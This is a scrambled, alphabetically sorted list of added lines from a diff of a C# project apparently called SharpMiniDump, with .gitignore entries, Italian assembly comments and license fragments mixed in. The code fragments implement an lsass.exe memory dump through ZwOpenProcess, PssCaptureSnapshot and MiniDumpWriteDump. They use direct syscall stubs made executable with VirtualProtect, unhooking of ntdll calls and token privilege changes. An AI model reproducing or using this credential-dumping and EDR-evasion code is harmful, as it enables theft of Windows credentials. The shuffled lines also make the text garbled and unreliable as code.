+ Natives.PSS_CAPTURE_FLAGS.PSS_CAPTURE_THREAD_CONTEXT
+ Natives.PSS_CAPTURE_FLAGS.PSS_CAPTURE_THREAD_CONTEXT_EXTENDED
+ Natives.PSS_CAPTURE_FLAGS.PSS_CREATE_BREAKAWAY
+ Natives.PSS_CAPTURE_FLAGS.PSS_CREATE_BREAKAWAY_OPTIONAL
+ Natives.PSS_CAPTURE_FLAGS.PSS_CREATE_RELEASE_SECTION
+ Natives.PSS_CAPTURE_FLAGS.PSS_CREATE_USE_VM_ALLOCATIONS
+ Node.js Tools for Visual Studio
+ NuGet Packages
+ NuGet Symbol Packages
+ NuGet v3's project.json files produces more ignorable files
+ OR BUSINESS INTERRUPTION) HOWEVER
+ OpenCover UI analysis results
+ OrdinalBase
+ OrdinalsRVA 
+ Others
+ Paket dependency manager
+ PeHeader 
+ Publish Web Output
+ Python Tools for Visual Studio (PTVS)
+ RIA/Silverlight projects
+ ReSharper is a .NET coding add-in
+ SQL Server files
+ SYNCHRONIZE 
+ SharpMiniDump
+ StyleCop
+ TFS 2012 Local Workspace
+ TOKEN_ADJUST_DEFAULT 
+ TOKEN_ADJUST_GROUPS 
+ TOKEN_ASSIGN_PRIMARY 
+ TOKEN_DUPLICATE 
+ TOKEN_IMPERSONATE 
+ TOKEN_QUERY 
+ TOKEN_QUERY)
+ TOKEN_QUERY_SOURCE 
+ Tabs Studio
+ TeamCity is a build add-in
+ Telerik's JustMock configuration file
+ The packages folder can be ignored because of Package Restore
+ Uncomment if necessary however generally it will be regenerated when needed
+ Uncomment if you have tasks that create the project's static files in wwwroot
+ User-specific files
+ User-specific files (MonoDevelop/Xamarin Studio)
+ Visual C
+ Visual Studio 15
+ Visual Studio 2015/2017 cache/options directory
+ Visual Studio 2017 auto generated files
+ Visual Studio 6 auto-generated workspace file (contains which files were open etc.)
+ Visual Studio 6 build log
+ Visual Studio 6 workspace options file
+ Visual Studio LightSwitch build output
+ Visual Studio Trace Files
+ Visual Studio cache files
+ Visual Studio code coverage results
+ Visual Studio profiler
+ Web workbench (sass)
+ Windows Store app package directories and files
+ because we have git 
+ but database connection strings (with potential passwords) will be unencrypted
+ but keep track of directories ending in .cache
+ cache files
+ directory
+ files ending in .cache can be ignored
+ files generated by popular Visual Studio add-ons.
+ hModule == IntPtr.Zero)
+ i < NumberOfNames
+ in these scripts will be unencrypted
+ necessario accedere a un tipo in questo assembly da
+ new Win32Exception(Marshal.GetLastWin32Error()).Message)
+ osInfo.dwMinorVersion
+ pWinVerInfo.chOSMajorMinor)
+ pWinVerInfo.hTargetPID)
+ pipe
+ possibile specificare tutti i valori oppure impostare valori predefiniti per i numeri relativi alla revisione e alla build
+ pss)
+ ptr = syscall)
+ report files from converting an old project file
+ status 
+ status)
+ text=auto
+ tools/
+ utilizzato come ID della libreria dei tipi
+!.axoCover/settings.json
+"                        (UIntPtr)syscall.Length, 0x40, out uint oldprotect))"
+"                    Delegates.NtAllocateVirtualMemory myAssemblyFunction = (Delegates.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtAllocateVirtualMemory))"
+"                    Delegates.NtCreateFile myAssemblyFunction = (Delegates.NtCreateFile)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtCreateFile))"
+"                    Delegates.NtFreeVirtualMemory myAssemblyFunction = (Delegates.NtFreeVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtFreeVirtualMemory))"
+"                    Delegates.ZwClose myAssemblyFunction = (Delegates.ZwClose)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.ZwClose))"
+"                    Delegates.ZwOpenProcess myAssemblyFunction = (Delegates.ZwOpenProcess)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.ZwOpenProcess))"
+"                    Delegates.ZwProtectVirtualMemory myAssemblyFunction = (Delegates.ZwProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.ZwProtectVirtualMemory))"
+"                    Delegates.ZwQuerySystemInformation myAssemblyFunction = (Delegates.ZwQuerySystemInformation)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.ZwQuerySystemInformation))"
+"                    Delegates.ZwWriteVirtualMemory myAssemblyFunction = (Delegates.ZwWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.ZwWriteVirtualMemory))"
+"                    if (!Natives.VirtualProtect( memoryAddress,"
+"                    if (!Natives.VirtualProtect(memoryAddress,"
+"                    return (NTSTATUS)myAssemblyFunction(SystemInformationClass, SystemInformation, SystemInformationLength, ref ReturnLength)"
+"                    return (NTSTATUS)myAssemblyFunction(hProcess, lpBaseAddress, lpBuffer, nSize, ref lpNumberOfBytesWritten)"
+"                    return (NTSTATUS)myAssemblyFunction(hProcess, ref BaseAddress, ZeroBits, ref RegionSize, AllocationType, Protect)"
+"                    return (NTSTATUS)myAssemblyFunction(hProcess, ref BaseAddress, ref RegionSize, FreeType)"
+"                    return (NTSTATUS)myAssemblyFunction(hProcess, ref lpBaseAddress, ref NumberOfBytesToProtect, NewAccessProtection, ref lpNumberOfBytesWritten)"
+"                    return (NTSTATUS)myAssemblyFunction(out fileHandle,"
+"                    return (NTSTATUS)myAssemblyFunction(out hProcess, processAccess, objAttribute, ref clientid)"
+"                 createDisposition,"
+"                 createOptions,"
+"                 desiredAccess,"
+"                 eaBuffer,"
+"                 fileAttributes,"
+"                 shareAccess,"
+"                (int)Natives.FILE_GENERIC_WRITE,"
+"                Attributes = 0x00000040,"
+"                Console.WriteLine(""AdjustTokenPrivileges() Error: "" "
+"                Console.WriteLine(""Error LookupPrivilegeValue"" "
+"                Console.WriteLine(""Error OpenProcessToken "" "
+"                Console.WriteLine(""Run in High integrity context"")"
+"                Console.WriteLine(""[x] Error MiniDumpWriteDump  "")"
+"                Console.WriteLine(""[x] Error NtCreateFile10  "" "
+"                Console.WriteLine(""[x] Error PssCaptureSnapshot  "")"
+"                Console.WriteLine(""[x] Error ZwOpenProcess10  "" "
+"                Console.WriteLine(""[x] Error ZwProtectVirtualMemory10 1 "" "
+"                Console.WriteLine(""[x] Error ZwProtectVirtualMemory10 2"" "
+"                Console.WriteLine(""[x] Error ZwWriteVirtualMemory10 "" "
+"                Console.WriteLine(""[x] Windows 10 - Windows Server 2016 only"")"
+"                Console.WriteLine(""[x] error unhooking {0}"", pWinVerInfo.lpApiCall)"
+"                Int32 desiredAccess,"
+"                IntPtr eaBuffer,"
+"                Length = (ulong)Marshal.SizeOf(typeof(Natives.OBJECT_ATTRIBUTES)),"
+"                Natives.FILE_ATTRIBUTE_NORMAL,"
+"                Natives.FILE_OVERWRITE_IF,"
+"                Natives.FILE_SYNCHRONOUS_IO_NONALERT,"
+"                Natives.TOKEN_INFORMATION_CLASS.TokenElevation,"
+"                ObjectName = objectName,"
+"                RootDirectory = IntPtr.Zero,"
+"                SecurityDescriptor = IntPtr.Zero,"
+"                System.IO.FileShare shareAccess,"
+"                System.IO.FileShare.Write,"
+"                UInt32 createDisposition,"
+"                UInt32 createOptions,"
+"                UInt32 dwFlags,"
+"                UInt32 fileAttributes,"
+"                hElm, 0)"
+"                hToken,"
+"                lpValue,"
+"                out IO_STATUS_BLOCK ioStatusBlock,"
+"                out IoStatusBlock,"
+"                out hDmpFile,"
+"                out ioStatusBlock,"
+"                ref FileObjectAttributes,"
+"                ref Int64 allocationSize,"
+"                ref Natives.UNICODE_STRING ModuleFileName,"
+"                ref OBJECT_ATTRIBUTES objectAttributes,"
+"                ref allocationSize,"
+"                ref allocationsize,"
+"                ref objectAttributes,"
+"                return string.Format(""High:{0}, Low:{1}"", this.High, this.Low)"
+"                throw new InvalidOperationException(""Failed to parse module exports."")"
+"                tokenInformationLength,"
+"            Abandoned = 0x00000080,"
+"            AbandonedWait0 = 0x00000080,"
+"            AbandonedWait1 = 0x00000081,"
+"            AbandonedWait2 = 0x00000082,"
+"            AbandonedWait3 = 0x00000083,"
+"            AbandonedWait63 = 0x000000bf,"
+"            AccessDenied = 0xc0000022,"
+"            AccessViolation = 0xc0000005,"
+"            AccountDisabled = 0xc0000072,"
+"            AccountRestriction = 0xc000006e,"
+"            AgentsExhausted = 0xc0000085,"
+"            Alerted = 0x00000101,"
+"            All = 0x001F0FFF,"
+"            AlreadyCommitted = 0xc0000021,"
+"            ArrayBoundsExceeded = 0xc000008c,"
+"            BadFileType = 0xc0000903,"
+"            BadInheritanceAcl = 0xc000007d,"
+"            BadInitialPc = 0xc000000a,"
+"            BadInitialStack = 0xc0000009,"
+"            BadStack = 0xc0000028,"
+"            BadWorkingSetLimit = 0xc000004c,"
+"            Breakpoint = 0x80000003,"
+"            BufferOverflow = 0x80000005,"
+"            BufferTooSmall = 0xc0000023,"
+"            CONTEXT_i386 = 0x10000,"
+"            CONTEXT_i486 = 0x10000,   //  same as i386"
+"            CallbackBypass = 0xc0000503,"
+"            CancelCallback,"
+"            Cancelled = 0xc0000120,"
+"            CannotDelete = 0xc0000121,"
+"            CannotExecuteFileInTransaction = 0xc0190044,"
+"            CantBreakTransactionalDependency = 0xc0190037,"
+"            CantCreateMoreStreamMiniversions = 0xc0190026,"
+"            CantCrossRmBoundary = 0xc0190038,"
+"            CantDisableMandatory = 0xc000005d,"
+"            CantOpenMiniversionWithModifyIntent = 0xc0190025,"
+"            CantRecoverWithHandleOpen = 0xc0190031,"
+"            CantTerminateSelf = 0xc00000db,"
+"            CantWait = 0xc00000d8,"
+"            CheckOutRequired = 0xc0000902,"
+"            CommitmentLimit = 0xc000012d,"
+"            ConflictingAddresses = 0xc0000018,"
+"            Console.WriteLine(""["
+"            ControlCExit = 0xc000013a,"
+"            CouldNotResizeLog = 0xc0190009,"
+"            CrashDump = 0x00000116,"
+"            CrcError = 0xc000003f,"
+"            CreateProcess = 0x000000080,"
+"            CreateThread = 0x00000002,"
+"            CrmProtocolAlreadyExists = 0xc019000f,"
+"            CrmProtocolNotFound = 0xc0190011,"
+"            CtlFileNotSupported = 0xc0000057,"
+"            CurrentTransactionNotValid = 0xc0190018,"
+"            DataError = 0xc000003e,"
+"            DataLate = 0xc000003d,"
+"            DataOverrun = 0xc000003c,"
+"            DatatypeMisalignment = 0x80000002,"
+"            DebuggerInactive = 0xc0000354,"
+"            DeletePending = 0xc0000056,"
+"            DeviceBusy = 0x80000011,"
+"            DifferenceAtDc = 0xc0000133,"
+"            DirectoryNotRm = 0xc0190008,"
+"            DiskFull = 0xc000007f,"
+"            DllMightBeInsecure = 0x8000002b,"
+"            DllNotFound = 0xc0000135,"
+"            DuplicateHandle = 0x00000040,"
+"            EaCorruptError = 0xc0000053,"
+"            EaListInconsistent = 0x80000014,"
+"            EaTooLarge = 0xc0000050,"
+"            EasNotSupported = 0xc000004f,"
+"            EfsNotAllowedInTransaction = 0xc019003e,"
+"            EndOfFile = 0xc0000011,"
+"            EnlistmentNotSuperior = 0xc0190033,"
+"            EntryPointNotFound = 0xc0000139,"
+"            Error = 0xc0000000,"
+"            FileCheckedOut = 0xc0000901,"
+"            FileClosed = 0xc0000128,"
+"            FileDeleted = 0xc0000123,"
+"            FileForcedClosed = 0xc00000b6,"
+"            FileIdentityNotPersistent = 0xc0190036,"
+"            FileInvalid = 0xc0000098,"
+"            FileLockConflict = 0xc0000054,"
+"            FileLockedWithOnlyReaders = 0x0000012a,"
+"            FileLockedWithWriters = 0x0000012b,"
+"            FileRenamed = 0xc00000d5,"
+"            FileTooLarge = 0xc0000904,"
+"            FloatDenormalOperand = 0xc000008d,"
+"            FloatDivideByZero = 0xc000008e,"
+"            FloatInexactResult = 0xc000008f,"
+"            FloatInvalidOperation = 0xc0000090,"
+"            FloatOverflow = 0xc0000091,"
+"            FloatStackCheck = 0xc0000092,"
+"            FloatUnderflow = 0xc0000093,"
+"            FormsAuthRequired = 0xc0000905,"
+"            GroupExists = 0xc0000065,"
+"            GuardPageViolation = 0x80000001,"
+"            GuidsExhausted = 0xc0000083,"
+"            HandleNoLongerValid = 0xc0190028,"
+"            HandlesClosed = 0x8000000a,"
+"            IllFormedPassword = 0xc000006b,"
+"            IllegalFunction = 0xc00000af,"
+"            IllegalInstruction = 0xc000001d,"
+"            ImageNotAtBase = 0x40000003,"
+"            InPageError = 0xc0000006,"
+"            IncludeModuleCallback,"
+"            IncludeThreadCallback,"
+"            IncludeVmRegionCallback,"
+"            IncompatibleFileMap = 0xc000004d,"
+"            IndoubtTransactionsExist = 0xc019003a,"
+"            InfoLengthMismatch = 0xc0000004,"
+"            Informational = 0x40000000,"
+"            InstanceNotAvailable = 0xc00000ab,"
+"            IntPtr ntdll = Natives.LoadLibrary(""ntdll.dll"")"
+"            IntPtr proc = GetProcAddress(GetAdvapi32(), ""AdjustTokenPrivileges"")"
+"            IntPtr proc = GetProcAddress(GetAdvapi32(), ""LookupPrivilegeValueA"")"
+"            IntPtr proc = GetProcAddress(GetDbgcore(), ""MiniDumpWriteDump"")"
+"            IntPtr proc = GetProcAddress(GetKernel32(), ""CloseHandle"")"
+"            IntPtr proc = GetProcAddress(GetKernel32(), ""GetCurrentProcess"")"
+"            IntPtr proc = GetProcAddress(GetKernel32(), ""PssCaptureSnapshot"")"
+"            IntPtr proc = GetProcAddress(GetKernelbase(), ""GetTokenInformation"")"
+"            IntPtr proc = GetProcAddress(GetKernelbase(), ""InitializeProcThreadAttributeList"")"
+"            IntPtr proc = GetProcAddress(GetKernelbase(), ""OpenProcessToken"")"
+"            IntPtr proc = GetProcAddress(GetKernelbase(), ""UpdateProcThreadAttribute"")"
+"            IntPtr proc = GetProcAddress(GetKernelbase(), ""VirtualProtect"")"
+"            IntPtr proc = GetProcAddress(GetKernelbase(), ""VirtualProtectEx"")"
+"            IntPtr proc = GetProcAddress(GetNtDll(), ""LdrLoadDll"")"
+"            IntPtr proc = GetProcAddress(GetNtDll(), ""NtFilterToken"")"
+"            IntPtr proc = GetProcAddress(GetNtDll(), ""RtlGetVersion"")"
+"            IntPtr proc = GetProcAddress(GetNtDll(), ""RtlInitUnicodeString"")"
+"            IntPtr proc = Natives.GetProcAddress(ntdll, pWinVerInfo.lpApiCall)"
+"            IntegerDivideByZero = 0xc0000094,"
+"            IntegerOverflow = 0xc0000095,"
+"            InternalError = 0xc00000e5,"
+"            InvalidAccountName = 0xc0000062,"
+"            InvalidAcl = 0xc0000077,"
+"            InvalidCid = 0xc000000b,"
+"            InvalidComputerName = 0xc0000122,"
+"            InvalidDeviceRequest = 0xc0000010,"
+"            InvalidEaName = 0x80000013,"
+"            InvalidHandle = 0xc0000008,"
+"            InvalidIdAuthority = 0xc0000084,"
+"            InvalidImageFormat = 0xc000007b,"
+"            InvalidImageLeFormat = 0xc000012e,"
+"            InvalidImageNotMz = 0xc000012f,"
+"            InvalidImageProtect = 0xc0000130,"
+"            InvalidImageWin16 = 0xc0000131,"
+"            InvalidInfoClass = 0xc0000003,"
+"            InvalidLogonHours = 0xc000006f,"
+"            InvalidMessage = 0xc0000702,"
+"            InvalidOwner = 0xc000005a,"
+"            InvalidPageProtection = 0xc0000045,"
+"            InvalidParameter = 0xc000000d,"
+"            InvalidParameter1 = 0xc00000ef,"
+"            InvalidParameter10 = 0xc00000f8,"
+"            InvalidParameter11 = 0xc00000f9,"
+"            InvalidParameter12 = 0xc00000fa,"
+"            InvalidParameter2 = 0xc00000f0,"
+"            InvalidParameter3 = 0xc00000f1,"
+"            InvalidParameter4 = 0xc00000f2,"
+"            InvalidParameter5 = 0xc00000f3,"
+"            InvalidParameter6 = 0xc00000f4,"
+"            InvalidParameter7 = 0xc00000f5,"
+"            InvalidParameter8 = 0xc00000f6,"
+"            InvalidParameter9 = 0xc00000f7,"
+"            InvalidParameterMix = 0xc0000030,"
+"            InvalidPipeState = 0xc00000ad,"
+"            InvalidPortHandle = 0xc0000042,"
+"            InvalidPrimaryGroup = 0xc000005b,"
+"            InvalidReadMode = 0xc00000b4,"
+"            InvalidSecurityDescr = 0xc0000079,"
+"            InvalidSid = 0xc0000078,"
+"            InvalidSubAuthority = 0xc0000076,"
+"            InvalidTransaction = 0xc0190002,"
+"            InvalidVolumeLabel = 0xc0000086,"
+"            InvalidWorkstation = 0xc0000070,"
+"            IoFinishCallback,"
+"            IoPrivilegeFailed = 0xc0000137,"
+"            IoStartCallback,"
+"            IoTimeout = 0xc00000b5,"
+"            IoWriteAllCallback,"
+"            IsProcessSnapshotCallback,"
+"            KernelApc = 0x00000100,"
+"            KernelMinidumpStatusCallback,"
+"            LastAdmin = 0xc0000069,"
+"            LockNotGranted = 0xc0000055,"
+"            LogCorruptionDetected = 0xc0190030,"
+"            LogGrowthFailed = 0xc0190019,"
+"            LogResizeInvalidSize = 0xc019000b,"
+"            LogonFailure = 0xc000006d,"
+"            LogonServer = 0xc0000132,"
+"            LongJump = 0x80000026,"
+"            LpcInvalidConnectionUsage = 0xc0000706,"
+"            LpcReceiveBufferExpected = 0xc0000705,"
+"            LpcRequestsNotAllowed = 0xc0000707,"
+"            LuidsExhausted = 0xc0000075,"
+"            MEM_COMMIT = 0x1000,"
+"            MEM_FREE = 0x10000,"
+"            MEM_IMAGE = 0x1000000,"
+"            MEM_MAPPED = 0x40000,"
+"            MappedFileSizeZero = 0xc000011e,"
+"            Marshal.Copy(AssemblyBytes, 0, unmanagedPointer, AssemblyBytes.Length)"
+"            Marshal.StructureToPtr(CallbackInfo, pCallbackInfo, false)"
+"            Marshal.StructureToPtr(tk, lpValue, false)"
+"            Marshal.StructureToPtr(uFileName, objectName, true)"
+"            MemberInGroup = 0xc0000067,"
+"            MemberNotInGroup = 0xc0000068,"
+"            MembersPrimaryGroup = 0xc0000127,"
+"            MemoryCallback,"
+"            MessageLost = 0xc0000701,"
+"            MiniversionInaccessibleFromSpecifiedTransaction = 0xc0190024,"
+"            ModuleCallback,"
+"            ModuleReferencedByMemory = 0x0010,"
+"            ModuleWriteCvRecord = 0x0008,"
+"            ModuleWriteDataSeg = 0x0002,"
+"            ModuleWriteMiscRecord = 0x0004,"
+"            ModuleWriteModule = 0x0001,"
+"            ModuleWriteTlsData = 0x0020,"
+"            MoreEntries = 0x00000105,"
+"            MutantNotOwned = 0xc0000046,"
+"            NTSTATUS res = NativeSysCall.ZwOpenProcess10(ref hProcess, processAccess, objAttribute, ref clientid)"
+"            NativeSysCall.Delegates.AdjustTokenPrivileges AdjustTokenPrivileges = (NativeSysCall.Delegates.AdjustTokenPrivileges)Marshal.GetDelegateForFunctionPointer(proc, typeof(NativeSysCall.Delegates.AdjustTokenPrivileges))"
+"            NativeSysCall.Delegates.CloseHandle CloseHandle = (NativeSysCall.Delegates.CloseHandle)Marshal.GetDelegateForFunctionPointer(proc, typeof(NativeSysCall.Delegates.CloseHandle))"
+"            NativeSysCall.Delegates.GetCurrentProcess GetCurrentProcess = (NativeSysCall.Delegates.GetCurrentProcess)Marshal.GetDelegateForFunctionPointer(proc, typeof(NativeSysCall.Delegates.GetCurrentProcess))"
+"            NativeSysCall.Delegates.GetTokenInformation GetTokenInformation = (NativeSysCall.Delegates.GetTokenInformation)Marshal.GetDelegateForFunctionPointer(proc, typeof(NativeSysCall.Delegates.GetTokenInformation))"
+"            NativeSysCall.Delegates.InitializeProcThreadAttributeList InitializeProcThreadAttributeList = (NativeSysCall.Delegates.InitializeProcThreadAttributeList)Marshal.GetDelegateForFunctionPointer(proc, typeof(NativeSysCall.Delegates.InitializeProcThreadAttributeList))"
+"            NativeSysCall.Delegates.LdrLoadDll LdrLoadDll = (NativeSysCall.Delegates.LdrLoadDll)Marshal.GetDelegateForFunctionPointer(proc, typeof(NativeSysCall.Delegates.LdrLoadDll))"
+"            NativeSysCall.Delegates.LookupPrivilegeValue LookupPrivilegeValue = (NativeSysCall.Delegates.LookupPrivilegeValue)Marshal.GetDelegateForFunctionPointer(proc, typeof(NativeSysCall.Delegates.LookupPrivilegeValue))"
+"            NativeSysCall.Delegates.MiniDumpWriteDump MiniDumpWriteDump = (NativeSysCall.Delegates.MiniDumpWriteDump)Marshal.GetDelegateForFunctionPointer(proc, typeof(NativeSysCall.Delegates.MiniDumpWriteDump))"
+"            NativeSysCall.Delegates.NtFilterToken NtSetInformationToken = (NativeSysCall.Delegates.NtFilterToken)Marshal.GetDelegateForFunctionPointer(proc, typeof(NativeSysCall.Delegates.NtFilterToken))"
+"            NativeSysCall.Delegates.OpenProcessToken OpenProcessToken = (NativeSysCall.Delegates.OpenProcessToken)Marshal.GetDelegateForFunctionPointer(proc, typeof(NativeSysCall.Delegates.OpenProcessToken))"
+"            NativeSysCall.Delegates.PssCaptureSnapshot PssCaptureSnapshot = (NativeSysCall.Delegates.PssCaptureSnapshot)Marshal.GetDelegateForFunctionPointer(proc, typeof(NativeSysCall.Delegates.PssCaptureSnapshot))"
+"            NativeSysCall.Delegates.RtlGetVersion RtlGetVersion = (NativeSysCall.Delegates.RtlGetVersion)Marshal.GetDelegateForFunctionPointer(proc, typeof(NativeSysCall.Delegates.RtlGetVersion))"
+"            NativeSysCall.Delegates.RtlInitUnicodeString RtlInitUnicodeString = (NativeSysCall.Delegates.RtlInitUnicodeString)Marshal.GetDelegateForFunctionPointer(proc, typeof(NativeSysCall.Delegates.RtlInitUnicodeString))"
+"            NativeSysCall.Delegates.UpdateProcThreadAttribute UpdateProcThreadAttribute = (NativeSysCall.Delegates.UpdateProcThreadAttribute)Marshal.GetDelegateForFunctionPointer(proc, typeof(NativeSysCall.Delegates.UpdateProcThreadAttribute))"
+"            NativeSysCall.Delegates.VirtualProtect VirtualProtect = (NativeSysCall.Delegates.VirtualProtect)Marshal.GetDelegateForFunctionPointer(proc, typeof(NativeSysCall.Delegates.VirtualProtect))"
+"            NativeSysCall.Delegates.VirtualProtectEx VirtualProtectEx = (NativeSysCall.Delegates.VirtualProtectEx)Marshal.GetDelegateForFunctionPointer(proc, typeof(NativeSysCall.Delegates.VirtualProtectEx))"
+"            Natives.NTSTATUS CallResult = (Natives.NTSTATUS)Natives.LdrLoadDll(IntPtr.Zero, 0, ref uModuleName, ref hModule)"
+"            Natives.RtlInitUnicodeString(ref pWinVerInfo.ProcName, @""lsass.exe"")"
+"            Natives.RtlInitUnicodeString(ref uFileName, @"""
+"            Natives.RtlInitUnicodeString(ref uModuleName, DLLPath)"
+"            Natives.TOKEN_ELEVATION elv = (Natives.TOKEN_ELEVATION)Marshal.PtrToStructure(lpValue, typeof(Natives.TOKEN_ELEVATION))"
+"            NoEasOnFile = 0xc0000052,"
+"            NoImpersonationToken = 0xc000005c,"
+"            NoLogonServers = 0xc000005e,"
+"            NoMediaInDevice = 0xc0000013,"
+"            NoMemory = 0xc0000017,"
+"            NoMoreEntries = 0x8000001a,"
+"            NoMoreFiles = 0x80000006,"
+"            NoQuotasForAccount = 0x0000010d,"
+"            NoSuchDevice = 0xc000000e,"
+"            NoSuchFile = 0xc000000f,"
+"            NoSuchGroup = 0xc0000066,"
+"            NoSuchLogonSession = 0xc000005f,"
+"            NoSuchPrivilege = 0xc0000060,"
+"            NoSuchUser = 0xc0000064,"
+"            NoToken = 0xc000007c,"
+"            NoTxfMetadata = 0xc0190029,"
+"            NonContinuableException = 0xc0000025,"
+"            NonExistentEaEntry = 0xc0000051,"
+"            NoneMapped = 0xc0000073,"
+"            NotAllAssigned = 0x00000106,"
+"            NotCommitted = 0xc000002d,"
+"            NotImplemented = 0xc0000002,"
+"            NotLocked = 0xc000002a,"
+"            NotMappedData = 0xc0000088,"
+"            NotMappedView = 0xc0000019,"
+"            NotSameDevice = 0xc00000d4,"
+"            NothingToTerminate = 0x00000122,"
+"            NotifyCleanup = 0x0000010b,"
+"            NotifyEnumDir = 0x0000010c,"
+"            ObjectNameCollision = 0xc0000035,"
+"            ObjectNameExists = 0x40000000,"
+"            ObjectNameInvalid = 0xc0000033,"
+"            ObjectNameNotFound = 0xc0000034,"
+"            ObjectNoLongerExists = 0xc0190021,"
+"            ObjectPathInvalid = 0xc0000039,"
+"            ObjectPathNotFound = 0xc000003a,"
+"            ObjectPathSyntaxBad = 0xc000003b,"
+"            ObjectTypeMismatch = 0xc0000024,"
+"            OpLockBreakInProgress = 0x00000108,"
+"            OrdinalNotFound = 0xc0000138,"
+"            PAGE_EXECUTE = 0x10,"
+"            PAGE_EXECUTE_READ = 0x20,"
+"            PAGE_EXECUTE_READWRITE = 0x40,"
+"            PAGE_EXECUTE_WRITECOPY = 0x80,"
+"            PAGE_GUARD = 0x100,"
+"            PAGE_NOACCESS = 0x01,"
+"            PAGE_NOCACHE = 0x200,"
+"            PAGE_READONLY = 0x02,"
+"            PAGE_READWRITE = 0x04,"
+"            PAGE_TARGETS_INVALID = 0x40000000,"
+"            PAGE_TARGETS_NO_UPDATE = 0x40000000,"
+"            PAGE_WRITECOPY = 0x08,"
+"            PSS_CAPTURE_HANDLES,"
+"            PSS_CAPTURE_HANDLE_BASIC_INFORMATION,"
+"            PSS_CAPTURE_HANDLE_NAME_INFORMATION,"
+"            PSS_CAPTURE_HANDLE_TRACE,"
+"            PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION,"
+"            PSS_CAPTURE_IPT_TRACE,"
+"            PSS_CAPTURE_NONE,"
+"            PSS_CAPTURE_RESERVED_00000002,"
+"            PSS_CAPTURE_RESERVED_00000400,"
+"            PSS_CAPTURE_THREADS,"
+"            PSS_CAPTURE_THREAD_CONTEXT,"
+"            PSS_CAPTURE_THREAD_CONTEXT_EXTENDED,"
+"            PSS_CAPTURE_VA_CLONE,"
+"            PSS_CAPTURE_VA_SPACE,"
+"            PSS_CAPTURE_VA_SPACE_SECTION_INFORMATION,"
+"            PSS_CREATE_BREAKAWAY,"
+"            PSS_CREATE_BREAKAWAY_OPTIONAL,"
+"            PSS_CREATE_FORCE_BREAKAWAY,"
+"            PSS_CREATE_MEASURE_PERFORMANCE,"
+"            PSS_CREATE_USE_VM_ALLOCATIONS,"
+"            PageFaultCopyOnWrite = 0x00000112,"
+"            PageFaultDemandZero = 0x00000111,"
+"            PageFaultGuardPage = 0x00000113,"
+"            PageFaultPagingFile = 0x00000114,"
+"            PageFaultTransition = 0x00000110,"
+"            PagefileQuota = 0xc0000007,"
+"            PagefileQuotaExceeded = 0xc000012c,"
+"            PartialCopy = 0x8000000d,"
+"            PasswordExpired = 0xc0000071,"
+"            PasswordRestriction = 0xc000006c,"
+"            Pending = 0x00000103,"
+"            PipeBusy = 0xc00000ae,"
+"            PipeClosing = 0xc00000b1,"
+"            PipeConnected = 0xc00000b2,"
+"            PipeDisconnected = 0xc00000b0,"
+"            PipeEmpty = 0xc00000d9,"
+"            PipeListening = 0xc00000b3,"
+"            PipeNotAvailable = 0xc00000ac,"
+"            PortAlreadySet = 0xc0000048,"
+"            PortClosed = 0xc0000700,"
+"            PortConnectionRefused = 0xc0000041,"
+"            PortNotSet = 0xc0000353,"
+"            PrimaryTransportConnectFailed = 0x0000010e,"
+"            PrivilegeNotHeld = 0xc0000061,"
+"            PrivilegedInstruction = 0xc0000096,"
+"            ProcedureNotFound = 0xc000007a,"
+"            ProcessCloned = 0x00000129,"
+"            ProcessInJob = 0x00000124,"
+"            ProcessIsProtected = 0xc0000712,"
+"            ProcessNotInJob = 0x00000123,"
+"            ProfilingNotStarted = 0xc00000b7,"
+"            ProfilingNotStopped = 0xc00000b8,"
+"            QueryInformation = 0x00000400,"
+"            QueryLimitedInformation = 0x00001000,"
+"            QuotaExceeded = 0xc0000044,"
+"            RangeNotLocked = 0xc000007e,"
+"            ReadMemoryFailureCallback,"
+"            RecoveryNotNeeded = 0xc0190034,"
+"            RecursiveDispatch = 0xc0000704,"
+"            RegistryRecovered = 0x40000009,"
+"            RemoteFileVersionMismatch = 0xc019000c,"
+"            RemoveMemoryCallback,"
+"            Reparse = 0x00000104,"
+"            ReparseObject = 0x00000118,"
+"            RequestCanceled = 0xc0000703,"
+"            ResourceDataNotFound = 0xc0000089,"
+"            ResourceInUse = 0xc0000708,"
+"            ResourceNameNotFound = 0xc000008b,"
+"            ResourceTypeNotFound = 0xc000008a,"
+"            RevisionMismatch = 0xc0000059,"
+"            RmAlreadyStarted = 0xc0190035,"
+"            RmDisconnected = 0xc0190032,"
+"            RmMetadataCorrupt = 0xc0190006,"
+"            RmNotActive = 0xc0190005,"
+"            RollbackTimerExpired = 0xc019003c,"
+"            RtlInitUnicodeString(ref DestinationString, SourceString)"
+"            RxActCommitted = 0x0000010a,"
+"            SecondaryFlagsCallback,"
+"            SectionNotExtended = 0xc0000087,"
+"            SectionNotImage = 0xc0000049,"
+"            SectionProtection = 0xc000004e,"
+"            SectionTooBig = 0xc0000040,"
+"            SemaphoreLimitExceeded = 0xc0000047,"
+"            ServerDisabled = 0xc0000080,"
+"            ServerNotDisabled = 0xc0000081,"
+"            SetInformation = 0x00000200,"
+"            SetQuota = 0x00000100,"
+"            SharingViolation = 0xc0000043,"
+"            SingleStep = 0x80000004,"
+"            SomeNotMapped = 0x00000107,"
+"            SpecialAccount = 0xc0000124,"
+"            SpecialGroup = 0xc0000125,"
+"            SpecialUser = 0xc0000126,"
+"            StreamMiniversionNotFound = 0xc0190022,"
+"            StreamMiniversionNotValid = 0xc0190023,"
+"            Success = 0x00000000,"
+"            SuspendCountExceeded = 0xc000004a,"
+"            SynchronizationRequired = 0xc0000134,"
+"            SystemAcpiAuditInformation = 0x007A,"
+"            SystemAitSamplingValue = 0x006F,"
+"            SystemBadPageInformation = 0x0080,"
+"            SystemBasicInformation = 0x0000,"
+"            SystemBasicPerformanceInformation = 0x007B,"
+"            SystemBigPoolInformation = 0x0042,"
+"            SystemBootEntropyInformation = 0x0075,"
+"            SystemBootEnvironmentInformation = 0x005A,"
